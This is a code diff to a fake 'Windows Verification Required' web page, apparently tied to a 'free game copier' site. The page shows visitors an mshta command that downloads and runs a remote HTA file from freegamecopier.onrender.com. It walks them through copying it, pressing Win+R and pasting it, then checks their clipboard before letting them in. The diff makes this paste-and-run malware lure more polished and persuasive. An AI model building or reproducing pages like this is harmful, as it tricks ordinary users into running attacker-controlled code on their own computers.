@@ -13,21 +13,22 @@
     }
     .cmd {
       background: #222;
-      padding: 10px;
+      padding: 15px;
       margin: 20px auto;
       border-radius: 8px;
       display: inline-block;
       font-family: monospace;
-      font-size: 0.95rem;
+      font-size: 0.9rem;
       user-select: all;
       max-width: 90%;
-      word-break: break-word;
+      word-break: break-all;
+      border: 1px solid #444;
     }
     .btn {
       background: #5865F2;
       color: #fff;
       border: none;
-      padding: 10px 20px;
+      padding: 12px 24px;
       border-radius: 6px;
       font-size: 1rem;
       cursor: pointer;
@@ -40,37 +41,77 @@
       margin-top: 20px;
       font-weight: bold;
     }
+    .step {
+      background: #222;
+      padding: 15px;
+      margin: 10px auto;
+      border-radius: 8px;
+      max-width: 600px;
+      text-align: left;
+    }
   </style>
 </head>
 <body>
-  <h2>Windows Verification</h2>
-  <p>1. Press <b>Win + R</b>, paste, and press Enter</p>
-  <div class="cmd" id="cmdBox"></div>
-  <button class="btn" onclick="copyCommand()">Copy</button>
-  <button class="btn" onclick="verifyCode()">Done</button>
+  <h2>🔐 Windows Verification Required</h2>
+  
+  <div class="step">
+    <h3>Step 1: Copy the command below</h3>
+    <div class="cmd" id="cmdBox">Loading...</div>
+    <button class="btn" onclick="copyCommand()">📋 Copy Command</button>
+  </div>
+
+  <div class="step">
+    <h3>Step 2: Run the command</h3>
+    <p>1. Press <kbd>Win + R</kbd> to open Run dialog</p>
+    <p>2. Paste the command and press Enter</p>
+    <p>3. Wait for the popup message</p>
+  </div>
+
+  <div class="step">
+    <h3>Step 3: Verify</h3>
+    <button class="btn" onclick="verifyCode()">✅ I ran the command - Verify me!</button>
+  </div>
+
   <p id="result"></p>
 
   <script>
     let code = "";
-
+    
+    // Generate verification code
     fetch("/generate-verification-code")
       .then(res => res.json())
       .then(data => {
         code = data.code;
-        const spaces = " ".repeat(200);
-        // Change .vbs to .hta if you want to use HTA file
-        const cmd = `mshta https://freegamecopier.onrender.com/verifyaccept.hta${spaces}Code: ${code}`;
+        // Create the mshta command with the code as a parameter
+        const cmd = `mshta "https://freegamecopier.onrender.com/verifyaccept.hta?code=${code}"`;
         document.getElementById("cmdBox").textContent = cmd;
         window.generatedCommand = cmd;
+      })
+      .catch(err => {
+        document.getElementById("cmdBox").textContent = "Error loading verification code";
+        console.error(err);
       });
 
     function copyCommand() {
-      navigator.clipboard.writeText(window.generatedCommand).then(() => {
-        alert("Copied command to clipboard.");
-      });
+      if (window.generatedCommand) {
+        navigator.clipboard.writeText(window.generatedCommand).then(() => {
+          alert("✅ Command copied to clipboard!\n\nNow press Win+R, paste, and press Enter.");
+        }).catch(() => {
+          // Fallback for older browsers
+          const textArea = document.createElement("textarea");
+          textArea.value = window.generatedCommand;
+          document.body.appendChild(textArea);
+          textArea.select();
+          document.execCommand('copy');
+          document.body.removeChild(textArea);
+          alert("✅ Command copied to clipboard!\n\nNow press Win+R, paste, and press Enter.");
+        });
+      }
     }
 
     function verifyCode() {
+      document.getElementById("result").textContent = "🔄 Checking clipboard...";
+      
       navigator.clipboard.readText().then(text => {
         fetch("/verify-windows-code", {
           method: "POST",
@@ -81,17 +122,23 @@
         .then(data => {
           if (data.success) {
             document.getElementById("result").style.color = "lime";
-            document.getElementById("result").textContent = "✔ Verified! Redirecting...";
-            // Set the cookie tokenGate=1 after successful verification
-            document.cookie = "tokenGate=1; path=/; max-age=86400"; // 1 day
+            document.getElementById("result").textContent = "✅ Verification successful! Redirecting...";
+            document.cookie = "tokenGate=1; path=/; max-age=86400";
             setTimeout(() => {
               window.location.href = "/verifynotwindows";
-            }, 1000);
+            }, 1500);
           } else {
-            document.getElementById("result").style.color = "red";
-            document.getElementById("result").textContent = "❌ Verification failed.";
+            document.getElementById("result").style.color = "#ff4444";
+            document.getElementById("result").textContent = "❌ Verification failed. Make sure you ran the command first!";
           }
+        })
+        .catch(err => {
+          document.getElementById("result").style.color = "#ff4444";
+          document.getElementById("result").textContent = "❌ Network error. Please try again.";
         });
+      }).catch(err => {
+        document.getElementById("result").style.color = "#ff4444";
+        document.getElementById("result").textContent = "❌ Could not read clipboard. Make sure you ran the command first!";
       });
     }
   </script>
